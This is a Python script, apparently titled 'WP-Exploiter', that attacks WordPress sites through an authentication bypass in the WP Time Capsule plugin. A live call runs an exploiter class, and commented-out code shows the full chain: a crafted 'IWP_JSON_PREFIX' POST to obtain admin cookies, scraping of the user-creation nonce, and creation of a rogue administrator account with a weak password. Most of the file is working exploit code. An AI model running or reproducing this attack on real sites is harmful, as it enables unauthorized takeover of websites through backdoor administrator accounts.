"""
 __          __  _____             ______                  _           _   _
 \ \        / / |  __ \           |  ____|                | |         (_) | |
  \ \  /\  / /  | |__) |  ______  | |__    __  __  _ __   | |   ___    _  | |_    ___   _ __
   \ \/  \/ /   |  ___/  |______| |  __|   \ \/ / | '_ \  | |  / _ \  | | | __|  / _ \ | '__|
    \  /\  /    | |               | |____   >  <  | |_) | | | | (_) | | | | |_  |  __/ | |
     \/  \/     |_|               |______| /_/\_\ | .__/  |_|  \___/  |_|  \__|  \___| |_|
                                                  | |
                                                  |_|
"""
import random
import time

import requests

try:
    from config import logs
    from http_handler import RequestHandler, HTTPWithSession
    from wordpress import WPTimeCapsuleExploiter, UserAction
except Exception as e:
    print(e)


def main():
    exp = WPTimeCapsuleExploiter("http://elro-sec.com/dev1")
    is_ex = exp.exploit()
    # url = "http://elro-sec.com/dev1"
    # rawBody = "IWP_JSON_PREFIX"
    # headers = {"Referer": url, "IWP_JSON_PREFIX": "body"}
    # sess = requests.Session()
    # http = HTTPWithSession()
    # response = http.request(url=url, data=rawBody, headers=headers, method="POST")
    # print(response.request)
    # # response = sess.post(url, data=rawBody, headers=headers, verify=False, allow_redirects=False)
    # # # cookie = "{}".format(response.cookies)
    # # print(cookie)
    # admin_cookie = None
    # for cookie in response.cookies:
    #     if "logged" in cookie.name:
    #         admin_cookie = cookie
    # random.seed(time.time())
    # rand = random.randrange(1, 10000)
    # # response = http.request("{}/wp-admin/index.php".format(url), cookies=response.cookies, method="GET", headers=headers)
    # response = http.request(url="{}/wp-admin/user-new.php".format(url), method="GET", headers=headers)
    # bodt = str(response.content)
    # secret = bodt.split("_wpnonce_create-user\" value=\"")[1].split("\"")[0]
    # data = {
    #     "_wpnonce_create-user": secret,
    #     "action": "createuser",
    #     "_wp_http_referer": "{}/wp-admin/user-new.php".format(url),
    #     "email": "elro{}@elro-sec.com".format(rand),
    #     "user_login": "attack_{}".format(rand),
    #     "first_name": "Attacker",
    #     "last_name": "{}".format(rand),
    #     "url": "http://www.elro-sec.com",
    #     "pw_weak": "on",
    #     "role": "administrator",
    #     "pass1": "123456",
    #     "pass2": "123456",
    #     "createuser": "Add New User"
    # }
    # print(secret)
    # try:
    #     response = http.request("{}/wp-admin/user-new.php".format(url), method="POST", data=data,
    #                             headers=headers, redirect=False)
    # except:
    #     print("Good")
    # print(response)


if __name__ == '__main__':
    main()
